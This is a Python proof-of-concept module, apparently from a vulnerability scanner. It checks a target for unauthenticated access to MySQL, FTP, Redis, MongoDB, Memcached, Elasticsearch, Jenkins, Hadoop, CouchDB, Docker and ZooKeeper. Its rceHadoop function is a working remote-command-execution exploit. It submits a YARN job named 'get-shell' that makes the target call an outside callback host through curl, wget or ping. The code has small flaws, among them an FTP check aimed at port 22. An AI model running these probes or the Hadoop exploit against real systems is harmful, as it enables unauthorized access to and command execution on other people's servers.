import sys
import socket
import re

import requests
import pymysql
import ftplib
import pymongo
from kazoo.client import KazooClient

import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def connMySQL(host):
    try:
        conn = pymysql.connect(host=host, user="root", passwd="")
        cursor = conn.cursor()
        cursor.execute('SELECT VERSION()')
        version = cursor.fetchone()
        conn.close()
        return 'version：'+str(version)  #version：('5.5.53',)
    except Exception as e:
        pass
    return False


def connFtp(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.login('anonymous','anonymous')
        return host
    except Exception as e:
        pass
    return False

def connRedis(host,port = 6379):
    payload = b'\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        s.close()
        if recvdata and b'redis_version' in recvdata:
            return 'redis_version：'+str(re.findall(r"redis_version:(.*?)\\r\\n",str(recvdata))) #redis_version:['3.2.100']
    except Exception as e:
        pass
    return False

def connMongoDB(host,port = 27017):
    try:
        conn = pymongo.MongoClient(host,port,serverSelectionTimeoutMS=8)
        dbname = conn.database_names()
        if dbname:
            conn.close()
        return "dbinfo："+str(dbname)  #dbinfo：['admin', 'config', 'local']
    except Exception as e:
        pass
    return False

def connMemcached(host,port = 11211):
    payload = b'\x73\x74\x61\x74\x73\x0a'
    s = socket.socket()
    try:
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(2048)
        s.close()
        if recvdata and b'STAT version' in recvdata:
            return 'Version：'+str(re.findall(r'STAT version(.*?)\\r\\n',str(recvdata))) #Version：[' 1.4.4-14-g9c660c0']
    except Exception as e:
        pass
    return False

def connElasticsearch(host,port = 9200):
    Dic = ['_nodes','_rive','_cat']
    try:
        for Dir in Dic:
            url = 'http://%s:%s/%s/' % (host,port,Dir)
            content = requests.get(url,timeout=5,allow_redirects=True,verify=False).content
            if b'_river' in content or b'/_cat/master' in content:
                return 'Path：{}'.format(url)
    except Exception as e:
        pass
    return False

def connJenkins(host,port = 8080):
    Dic = ['manage','script']
    try:
        for Dir in Dic:
            url = 'http://%s:%s/%s/' % (host,port,Dir)
            res_code = requests.get(url, timeout=5, allow_redirects=True, verify=False).status_code
            if res_code == 200:
                return 'Path：{}'.format(url)
    except Exception as e:
        pass
    return False

def connHadoop(host,port = 50070):
    try:
        url = 'http://%s:%s/' % (host,port)
        res_code = requests.get(url, timeout=5, allow_redirects=True, verify=False).status_code
        if res_code == 200:
            return 'Path：'+url
    except Exception as e:
        pass
    return False

def rceHadoop(host,port = 8088):
    try:
        target = 'http://{}:{}'.format(host,port)

        url = target + '/ws/v1/cluster/apps/new-application'
        resp = requests.post(url)

        app_id= resp.json()['application-id']
        url = target + '/ws/v1/cluster/apps'
        
        if config.method!='ping':
            cmd = "{} {}/{}".format(config.method,config.ceye_path,url)
        else:
            cmd = "{} {}.{} -c 4".format(config.method,url,config.ceye_path)

        data = {
        'application-id': app_id,
        'application-name': 'get-shell',
        'am-container-spec': {
            'commands': {
                'command': cmd,
            },
        },
        'application-type': 'YARN',
        }
        # proxies = { 'http' : "http://127.0.0.1:8080"}
        s = requests.post(url, json=data).status_code
        if s == 202 or s==200:
            return 'Path：'+url
    except Exception as e:
        pass
    return False

def connCouchDB(host,port = 5984):
    try:
        url = 'http://%s:%s/_config/' % (host,port)
        res_code = requests.get(url, timeout=5, allow_redirects=True, verify=False).status_code
        if res_code == 200:
            return 'Path：'+url
    except:
        pass
    return False

def connDocker(host,port = 2375):
    Dic = ['/containers/json','/api/','/v1','/v2','']
    try:
        for Dir in Dic:
            url = 'http://%s:%s/%s' % (host,port,Dir)
            res_code = requests.get(url, timeout=5, allow_redirects=True, verify=False).status_code
            if res_code == 200:
                return 'Path：'+url
                
    except Exception as e:
        pass
    return False

def connZookeeper(host,port = 2181):
    try: 
        connZK = KazooClient(hosts="{}:{}".format(host,port),timeout=1)
        connZK.start()
        if connZK:
            return host
    except Exception as e:
        return False

def poc(url):
    poc_type = 'tools:unauthorized'

    ports = ['3306','22','6379','27017','11211','9200','8080','50070','5984','2375','2181','8088']

    port_info = {}

    port_info,ports = port_monitor(url, poc_type, ports)

    for port in ports:
        if port=='3306':
            data = connMySQL(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='22':
            data = connFtp(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='6379':
            data = connRedis(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='27017':
            data = connMongoDB(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='11211':
            data = connMemcached(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='9200':
            data = connElasticsearch(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='8080':
            data = connJenkins(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='50070':
            data = connHadoop(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='5984':
            data = connCouchDB(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port=='2375':
            data = connDocker(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
        elif port == '8088':
            data = rceHadoop(url)
            port_info[port] = [1,poc_type,data] if data!=False else [0,poc_type,'Not Vulnerable']
            
    return port_info

#参考https://www.secpulse.com/archives/61101.html https://xz.aliyun.com/t/2320#toc-31